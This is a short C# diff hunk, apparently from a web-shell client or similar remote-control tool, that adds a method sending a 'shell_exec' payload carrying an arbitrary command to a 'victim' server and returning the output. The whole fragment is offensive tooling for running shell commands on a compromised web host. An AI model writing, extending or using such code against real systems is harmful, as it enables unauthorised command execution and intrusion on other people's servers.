@@ -17,6 +17,12 @@ namespace Alien
             m_szCurrentDir = string.Empty;
         }
 
+        public async Task<string> fnShellExec(string szCommand)
+        {
+            string szResp = await m_web.fnszSendPayload("shell_exec", new string[] { szCommand, m_web.m_victim.ShellEncoding });
+            return szResp;
+        }
+
         /// <summary>
         /// Execute shell command and return current directory and output.
         /// </summary>
